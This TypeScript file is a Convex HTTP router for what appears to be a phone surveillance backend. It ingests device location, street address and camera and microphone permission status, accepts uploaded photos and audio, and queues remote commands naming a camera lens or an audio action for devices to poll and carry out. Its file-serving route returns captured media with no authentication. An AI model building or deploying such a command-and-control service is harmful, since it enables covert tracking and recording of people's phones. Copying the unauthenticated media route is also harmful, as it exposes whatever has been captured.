import { httpRouter } from "convex/server";
import { httpAction } from "./_generated/server";
import { internal, api } from "./_generated/api";

type IngestPayload = {
  deviceId?: unknown;
  deviceModel?: unknown;
  osVersion?: unknown;
  appVersion?: unknown;
  camera?: unknown;
  mic?: unknown;
  locationFine?: unknown;
  locationCoarse?: unknown;
  backgroundLocation?: unknown;
  lat?: unknown;
  lon?: unknown;
  accuracy?: unknown;
  address?: unknown;
  capturedAt?: unknown;
};

const asString = (v: unknown, fallback = "unknown"): string =>
  typeof v === "string" && v.length > 0 && v.length < 300 ? v : fallback;

const asBool = (v: unknown): boolean => v === true || v === "true";

const asNumber = (v: unknown): number | undefined => {
  const n = typeof v === "number" ? v : typeof v === "string" ? Number(v) : NaN;
  return Number.isFinite(n) ? n : undefined;
};

const ingest = httpAction(async (ctx, req) => {
  const secret = process.env.INGEST_KEY;
  const provided = req.headers.get("x-ingest-key");
  if (!secret || provided !== secret) {
    return new Response(JSON.stringify({ ok: false, error: "unauthorized" }), {
      status: 401,
      headers: { "content-type": "application/json" },
    });
  }

  let body: IngestPayload;
  try {
    body = (await req.json()) as IngestPayload;
  } catch {
    return new Response(JSON.stringify({ ok: false, error: "bad json" }), {
      status: 400,
      headers: { "content-type": "application/json" },
    });
  }

  const deviceId = asString(body.deviceId);
  if (deviceId === "unknown") {
    return new Response(JSON.stringify({ ok: false, error: "missing deviceId" }), {
      status: 400,
      headers: { "content-type": "application/json" },
    });
  }

  const capturedAt = asNumber(body.capturedAt) ?? Date.now();

  await ctx.runMutation(internal.captures.internalInsert, {
    deviceId,
    deviceModel: asString(body.deviceModel),
    osVersion: asString(body.osVersion),
    appVersion: asString(body.appVersion),
    camera: asBool(body.camera),
    mic: asBool(body.mic),
    locationFine: asBool(body.locationFine),
    locationCoarse: asBool(body.locationCoarse),
    backgroundLocation: asBool(body.backgroundLocation),
    lat: asNumber(body.lat),
    lon: asNumber(body.lon),
    accuracy: asNumber(body.accuracy),
    address:
      typeof body.address === "string" && body.address.length > 0 && body.address.length < 500
        ? body.address
        : undefined,
    capturedAt,
  });

  return new Response(JSON.stringify({ ok: true }), {
    status: 200,
    headers: { "content-type": "application/json" },
  });
});

const mediaUploadUrl = httpAction(async (ctx, req) => {
  const secret = process.env.INGEST_KEY;
  if (!secret || req.headers.get("x-ingest-key") !== secret) {
    return new Response(JSON.stringify({ ok: false, error: "unauthorized" }), { status: 401 });
  }
  const url = await ctx.storage.generateUploadUrl();
  return new Response(JSON.stringify({ url }), {
    status: 200,
    headers: { "content-type": "application/json" },
  });
});

const mediaInsert = httpAction(async (ctx, req) => {
  const secret = process.env.INGEST_KEY;
  if (!secret || req.headers.get("x-ingest-key") !== secret) {
    return new Response(JSON.stringify({ ok: false, error: "unauthorized" }), { status: 401 });
  }
  let body: Record<string, unknown>;
  try {
    body = (await req.json()) as Record<string, unknown>;
  } catch {
    return new Response(JSON.stringify({ ok: false, error: "bad json" }), { status: 400 });
  }
  const deviceId = asString(body.deviceId);
  if (deviceId === "unknown") {
    return new Response(JSON.stringify({ ok: false, error: "missing deviceId" }), { status: 400 });
  }
  const storageId = typeof body.storageId === "string" ? body.storageId : "";
  if (!storageId) {
    return new Response(JSON.stringify({ ok: false, error: "missing storageId" }), { status: 400 });
  }
  await ctx.runMutation(internal.media.internalInsertMedia, {
    deviceId,
    kind: asString(body.kind, "photo"),
    lens: typeof body.lens === "string" ? body.lens : undefined,
    storageId,
    mime: asString(body.mime, "application/octet-stream"),
    takenAt: asNumber(body.takenAt) ?? Date.now(),
    durationMs: asNumber(body.durationMs),
    seq: asNumber(body.seq),
  });
  return new Response(JSON.stringify({ ok: true }), {
    status: 200,
    headers: { "content-type": "application/json" },
  });
});

const poll = httpAction(async (ctx, req) => {
  const secret = process.env.INGEST_KEY;
  if (!secret || req.headers.get("x-ingest-key") !== secret) {
    return new Response(JSON.stringify({ ok: false, error: "unauthorized" }), { status: 401 });
  }
  const url = new URL(req.url);
  const deviceId = url.searchParams.get("deviceId") ?? "";
  if (!deviceId) {
    return new Response(JSON.stringify({ ok: false, error: "missing deviceId" }), { status: 400 });
  }
  const pending = await ctx.runQuery(internal.media.internalPending, { deviceId });
  const ids = pending.map((c) => c._id);
  if (ids.length > 0) {
    await ctx.runMutation(internal.media.internalMarkDelivered, { ids });
  }
  const commands = pending.map((c) => ({
    commandId: c._id,
    type: c.type,
    lens: c.lens,
    audioAction: c.audioAction,
  }));
  return new Response(JSON.stringify({ ok: true, commands }), {
    status: 200,
    headers: { "content-type": "application/json" },
  });
});

const commandDone = httpAction(async (ctx, req) => {
  const secret = process.env.INGEST_KEY;
  if (!secret || req.headers.get("x-ingest-key") !== secret) {
    return new Response(JSON.stringify({ ok: false, error: "unauthorized" }), { status: 401 });
  }
  let body: Record<string, unknown>;
  try {
    body = (await req.json()) as Record<string, unknown>;
  } catch {
    return new Response(JSON.stringify({ ok: false, error: "bad json" }), { status: 400 });
  }
  const commandId = typeof body.commandId === "string" ? body.commandId : "";
  if (!commandId) {
    return new Response(JSON.stringify({ ok: false, error: "missing commandId" }), { status: 400 });
  }
  const status = typeof body.status === "string" ? body.status : "failed";
  const resultMediaId = typeof body.resultMediaId === "string" ? body.resultMediaId : undefined;
  await ctx.runMutation(api.media.completeCommand, {
    commandId,
    status,
    resultMediaId,
  });
  return new Response(JSON.stringify({ ok: true }), {
    status: 200,
    headers: { "content-type": "application/json" },
  });
});

const serveFile = httpAction(async (ctx, req) => {
  const url = new URL(req.url);
  const id = url.pathname.replace("/api/file/", "");
  if (!id) return new Response("Not found", { status: 404 });
  const record = await ctx.runQuery(internal.media.mediaByStorage, { storageId: id });
  const blob = await ctx.storage.get(id);
  if (!blob) return new Response("Not found", { status: 404 });
  return new Response(blob, {
    status: 200,
    headers: {
      "content-type": record?.mime || blob.type || "application/octet-stream",
      "cache-control": "private, max-age=86400, immutable",
    },
  });
});

const authConfigured = httpAction(async (ctx) => {
  const configured = await ctx.runQuery(api.auth.configured, {});
  return new Response(JSON.stringify({ configured }), {
    status: 200,
    headers: { "content-type": "application/json" },
  });
});

const authSetup = httpAction(async (ctx, req) => {
  let body: Record<string, unknown>;
  try {
    body = (await req.json()) as Record<string, unknown>;
  } catch {
    return new Response(JSON.stringify({ ok: false, error: "bad json" }), { status: 400 });
  }
  const password = typeof body.password === "string" ? body.password : "";
  const res = await ctx.runMutation(api.auth.setup, { password });
  return new Response(JSON.stringify(res), {
    status: res.ok ? 200 : 400,
    headers: { "content-type": "application/json" },
  });
});

const authLogin = httpAction(async (ctx, req) => {
  let body: Record<string, unknown>;
  try {
    body = (await req.json()) as Record<string, unknown>;
  } catch {
    return new Response(JSON.stringify({ ok: false, error: "bad json" }), { status: 400 });
  }
  const password = typeof body.password === "string" ? body.password : "";
  const res = await ctx.runMutation(api.auth.login, { password });
  return new Response(JSON.stringify(res), {
    status: res.ok ? 200 : 401,
    headers: { "content-type": "application/json" },
  });
});

const http = httpRouter();

http.route({
  path: "/api/ingest",
  method: "POST",
  handler: ingest,
});

http.route({
  path: "/api/media/url",
  method: "POST",
  handler: mediaUploadUrl,
});

http.route({
  path: "/api/media",
  method: "POST",
  handler: mediaInsert,
});

http.route({
  path: "/api/poll",
  method: "GET",
  handler: poll,
});

http.route({
  path: "/api/command/done",
  method: "POST",
  handler: commandDone,
});

http.route({
  pathPrefix: "/api/file/",
  method: "GET",
  handler: serveFile,
});

http.route({
  path: "/api/auth/configured",
  method: "GET",
  handler: authConfigured,
});

http.route({
  path: "/api/auth/setup",
  method: "POST",
  handler: authSetup,
});

http.route({
  path: "/api/auth/login",
  method: "POST",
  handler: authLogin,
});

export default http;
